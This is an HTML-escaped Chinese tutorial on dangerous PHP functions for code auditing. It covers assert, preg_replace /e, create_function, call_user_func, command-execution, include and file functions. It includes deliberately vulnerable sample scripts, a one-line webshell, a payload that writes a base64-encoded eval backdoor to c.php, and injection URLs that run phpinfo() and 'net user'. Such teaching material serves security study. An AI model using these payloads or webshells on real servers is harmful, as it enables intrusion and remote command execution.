&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断一个表达式是否成立。返回true or false。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般情况下，黑名单都会禁用 &lt;code&gt;eval()&lt;/code&gt;  函数，所以用 &lt;code&gt;assert&lt;/code&gt;  来代替 eval 来执行具体操作。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png&#34; alt=&#34;image-20210503103001094&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;assertion函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#assertion函数&#34;&gt;#&lt;/a&gt; assertion 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;检查一个断言是否为 FALSE。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php $_GET[a]($_GET[b]);?&amp;gt;  //一句话木马&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//payload： ?a=assert&amp;amp;b=&amp;#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;preg_replace函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preg_replace函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;preg_replace () 函数&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;preg_replace 函数执行一个正则表达式的搜索和替换。&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[pat];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[rep];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[sub];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		preg_replace(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?pat=/test/e&amp;amp;rep=phpinfo()&amp;amp;sub=jutst test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;也可以为&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?pat=/test/e&amp;amp;rep=var_dump(`net user`)&amp;amp;sub=jutst test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;create_function函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create_function函数&#34;&gt;#&lt;/a&gt; create_function () 函数&lt;/h3&gt;
&lt;p&gt;string create_function ( string $args , string $code )&lt;br&gt;
 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;sort_by&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sorter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;strnatcasecmp&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$databases&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1234&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;4321&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sort_function&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27; return 1 * &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sorter&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;($a[&amp;quot;&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;], $b[&amp;quot;&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;]);&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usort(&lt;span class=&#34;variable&#34;&gt;$databases&lt;/span&gt;, create_function(&lt;span class=&#34;string&#34;&gt;&amp;#x27;$a, $b&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$sort_function&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造匿名函数原型&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; * &lt;span class=&#34;string&#34;&gt;&amp;#x27; . $sorter . &amp;#x27;&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; . &lt;span class=&#34;subst&#34;&gt;$sort_by&lt;/span&gt; . &amp;#x27;&amp;quot;&lt;/span&gt;], &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; . &lt;span class=&#34;subst&#34;&gt;$sort_by&lt;/span&gt; . &amp;#x27;&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/test3.php?sort_by=%27%22]);&amp;#125;phpinfo();/*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png&#34; alt=&#34;image-20210503104641807&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;call_user_func函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#call_user_func函数&#34;&gt;#&lt;/a&gt; call_user_func 函数&lt;/h3&gt;
&lt;p&gt;mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )&lt;br&gt;
 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;assert&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo()&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    call_user_func(&lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503111406856.png&#34; alt=&#34;image-20210503111406856&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;call_user_func_array函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#call_user_func_array函数&#34;&gt;#&lt;/a&gt; call_user_func_array 函数&lt;/h3&gt;
&lt;p&gt;call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;命令执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令执行函数&#34;&gt;#&lt;/a&gt; 命令执行函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;exec ()  执行一个外部程序&lt;/li&gt;
&lt;li&gt;passthru ()  执行外部程序并且显示原始输出&lt;/li&gt;
&lt;li&gt;proc_open ()  执行一个命令，并且打开用来输入 / 输出的文件指针&lt;/li&gt;
&lt;li&gt;shell_exec ()  通过 shell 环境执行命令，将完整的输出以字符串方式返回&lt;/li&gt;
&lt;li&gt;system ()  执行外部程序，并且显示输出&lt;/li&gt;
&lt;li&gt;popen ()  通过 popen () 的参数传递一条命令，并对 popen () 所打开的文件进行执行&lt;/li&gt;
&lt;li&gt;escapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符转义&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;包含函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#包含函数&#34;&gt;#&lt;/a&gt; 包含函数&lt;/h2&gt;
&lt;p&gt;require、include、require_once、include_once&lt;br&gt;
 包含函数 一共有四个，主要作用为包含并运行指定文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 (E_COMPILE_ERROR) 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。&lt;/li&gt;
&lt;li&gt;include 语句包含并运行指定文件&lt;/li&gt;
&lt;li&gt;require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;include_once&lt;/em&gt; 语句在脚本执行期间包含并运行指定文件。此行为和 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmluY2x1ZGUucGhw&#34;&gt;include&lt;/span&gt; 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件操作函数官方文档&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件操作函数官方文档&#34;&gt;#&lt;/a&gt; 文件操作函数 (官方文档)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;copy  拷贝文件 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmNvcHkucGhw&#34;&gt;http://php.net/manual/zh/function.copy.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;file_get_contents  将整个文件读入一个字符串 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==&#34;&gt;http://php.net/manual/zh/function.file-get-contents.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;file_put_contents  将一个字符串写入文件  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtcHV0LWNvbnRlbnRzLnBocA==&#34;&gt;http://php.net/manual/zh/function.file-put-contents.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;file  把整个文件读入到一个数组中 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUucGhw&#34;&gt;http://php.net/manual/zh/function.file.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;fopen  打开文件或者 URL  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZvcGVuLnBocA==&#34;&gt;http://php.net/manual/zh/function.fopen.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;move_uploaded_file 将上传的文件移动到新位置 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLm1vdmUtdXBsb2FkZWQtZmlsZS5waHA=&#34;&gt;http://php.net/manual/zh/function.move-uploaded-file.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;readfile  输出文件 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlYWRmaWxlLnBocA==&#34;&gt;http://php.net/manual/zh/function.readfile.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;rename  重命名一个文件目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlbmFtZS5waHA=&#34;&gt;http://php.net/manual/zh/function.rename.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;rmdir  删除目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJtZGlyLnBocA==&#34;&gt;http://php.net/manual/zh/function.rmdir.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;unlink &amp;amp; delete  删除文件  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnVubGluay5waHA=&#34;&gt;http://php.net/manual/zh/function.unlink.php&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;特殊函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特殊函数&#34;&gt;#&lt;/a&gt; 特殊函数&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;phpinfo — 输出关于 PHP 配置的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;symlink — 建立符号连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readlink — 返回符号连接指向的目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getenv — 获取一个环境变量的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putenv — 设置环境变量的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dl — 运行时载入一个 PHP 扩展&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_get — 获取一个配置选项的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_set  ini_alter  ini_restore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;is_numeric - 数字判断 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;in_array 在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;变量覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#变量覆盖&#34;&gt;#&lt;/a&gt; 变量覆盖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;parse_str 如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。&lt;/li&gt;
&lt;li&gt;extract  本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。&lt;/li&gt;
&lt;li&gt;mb_parse_str  解析 GET/POST/COOKIE 数据并设置全局变量。&lt;/li&gt;
